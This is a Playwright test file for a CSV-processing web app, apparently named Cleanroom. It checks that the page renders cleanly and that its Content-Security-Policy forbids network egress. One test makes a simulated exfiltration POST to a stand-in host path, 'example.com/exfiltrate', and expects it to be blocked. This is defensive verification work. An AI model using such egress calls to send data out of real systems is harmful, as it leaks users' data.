import { expect, test } from '@playwright/test'

test.describe('application shell', () => {
  test('renders and reports its WebMCP environment', async ({ page }) => {
    const consoleErrors: string[] = []
    page.on('console', (msg) => {
      if (msg.type() === 'error') consoleErrors.push(msg.text())
    })
    page.on('pageerror', (err) => consoleErrors.push(err.message))

    await page.goto('/')

    await expect(page).toHaveTitle(/Cleanroom/)
    await expect(page.getByText('Drop a CSV here')).toBeVisible()
    await expect(page.getByText('The report is empty')).toBeVisible()
    await expect(page.getByTestId('env-pill')).toContainText('WebMCP:')

    expect(consoleErrors).toEqual([])
  })
})

test.describe('containment guarantee', () => {
  test('the served page forbids all network egress via CSP header', async ({
    page,
  }) => {
    const response = await page.goto('/')
    const csp = response?.headers()['content-security-policy'] ?? ''

    expect(csp).toContain("connect-src 'none'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("frame-ancestors 'none'")
  })

  test('the built artifact carries the policy in its own markup', async ({
    page,
  }) => {
    await page.goto('/')

    const meta = page.locator(
      'meta[http-equiv="Content-Security-Policy"]',
    )
    await expect(meta).toHaveCount(1)
    expect(await meta.getAttribute('content')).toContain("connect-src 'none'")
  })

  test('a network request from page context is actually blocked', async ({
    page,
  }) => {
    await page.goto('/')

    const outcome = await page.evaluate(async () => {
      try {
        await fetch('https://example.com/exfiltrate', { method: 'POST' })
        return 'allowed'
      } catch {
        return 'blocked'
      }
    })

    expect(outcome).toBe('blocked')
  })
})
